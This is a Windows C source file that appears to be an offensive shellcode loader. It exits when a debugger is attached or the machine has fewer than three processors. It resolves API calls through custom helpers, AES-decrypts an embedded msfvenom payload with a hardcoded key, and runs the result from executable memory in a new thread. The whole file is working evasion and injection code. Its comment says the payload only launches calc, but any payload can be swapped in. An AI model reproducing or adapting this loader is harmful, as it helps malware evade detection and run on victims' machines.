#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "helpers.h"
#include "aes.hpp"
#include "PEstructs.h"

#pragma comment(linker, "/entry:main")

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
typedef VOID(WINAPI* RtlMoveMemory_t)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE hHandle, DWORD  dwMilliseconds);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef VOID(WINAPI* GetSystemInfo_t)(LPSYSTEM_INFO lpSystemInfo);

int main() {
#ifdef _M_IX86 
	PEB* pPEB = (PEB*)__readfsdword(0x30);
#else
	PEB* pPEB = (PEB*)__readgsqword(0x60);
#endif

	if (pPEB->BeingDebugged) {
		return 0;
	}
	
	HMODULE kernel32dll = hlpGetModuleHandle(L"KERNEL32.DLL");

	GetSystemInfo_t pGetSystemInfo = (GetSystemInfo_t)hlpGetProcAddress(kernel32dll, (char*)"GetSystemInfo");	

	SYSTEM_INFO systemInfo;
	pGetSystemInfo(&systemInfo);
	int numProcessors = systemInfo.dwNumberOfProcessors;
	if (numProcessors < 3) {
		return numProcessors+1;
	}

	// Aes encrypted: msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c 
	unsigned char payload[] = "\x99\x16\xd5\x6c\x07\x14\x3b\x0e\x9a\x81\xaa\xe0\x10\x1a\xe8\xcd\xe2\xb9\x9a\x88\xb0\x17\xce\x61\x1b\x21\xa5\xe3\x23\xe2\x25\x7e\x37\x22\x72\x1e\x46\x32\x95\xa4\x76\x0a\x86\x0c\x21\xb5\xd6\xc3\xbe\x1a\x0f\xa2\x8b\x5a\x46\x19\xef\x55\x5b\xac\x2b\xf2\x31\xb3\x01\x1b\x2f\x76\xab\x1c\xde\x3b\xca\xc0\x40\xca\xbf\xf0\x39\x76\xb9\x11\x98\x92\xb3\x96\x06\x00\xe3\x8c\x55\xeb\xc4\x27\x13\xc6\xed\x9f\xc5\x5a\x80\xe3\x1d\x93\xca\xb6\x3e\xb8\xf6\x67\x9c\xf5\xcf\xf9\x3e\xec\xf8\xa3\xeb\x3f\xe4\x19\x1d\xd5\xdf\x1b\x48\x08\x4b\x3f\x42\xe8\x74\xa3\xb1\x92\xa9\x52\xe3\xcc\x47\xef\x87\x48\xad\x5a\x63\xd2\xee\x08\x11\x3f\x51\x80\xfc\x97\x57\xe9\x8b\x2d\x66\xc6\x52\xbe\x42\x5c\x95\x93\xc6\x80\x3d\xe1\xab\x06\xc0\xb0\x84\x6a\xf8\x1b\x97\xe4\xd5\x55\x08\x4a\xa4\xb6\x25\xa9\x76\x2a\x4e\xb0\x3b\x62\xd8\x73\xa7\xfb\x4f\xbb\x8f\x1b\x87\xcc\x4a\x36\xbe\xd1\x86\xf2\x1f\x4b\xe7\xad\xf9\x09\x83\x7f\x51\xc4\x4a\x92\xe9\x44\x10\x71\xa4\x41\x6d\x4c\xe2\x43\x60\x7c\xdf\x93\x82\xd5\x6d\x3d\xee\x81\x2b\x26\xdd\xd7\x23\x94\xdc\xdf\xd2\xcc\x4f\xf3\xbb\x69\x76\x49\x44\xdd\x25\xb8\xfd\x33\x2b\x8f\x16\x2c\x5c\x91";
	SIZE_T payloadSize = sizeof(payload);

	// decrypt shellcode encrypted with AesCrypter
	struct AES_ctx ctx;
	unsigned char key[] = "dead00af";
	unsigned char iv[] = "\xde\xad\xaf\x3b\xa3\x4b\xec\x66\x63\x66\x68\x51\x11\x47\xa5\x98";
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, payload, payloadSize);

	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)hlpGetProcAddress(kernel32dll, (char *)"VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)hlpGetProcAddress(kernel32dll, (char*)"RtlMoveMemory");
	CreateThread_t pCreateThread = (CreateThread_t)hlpGetProcAddress(kernel32dll, (char*)"CreateThread");
	VirtualProtect_t pVirtualProtect = (VirtualProtect_t)hlpGetProcAddress(kernel32dll, (char*)"VirtualProtect");
	WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t)hlpGetProcAddress(kernel32dll, (char*)"WaitForSingleObject");

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned int payload_len = sizeof(payload);

	// Allocate memory for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to allocated buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	rv = pVirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch the payload
	if (rv != 0) {
		th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		pWaitForSingleObject(th, -1);
	}

	return 0;
}
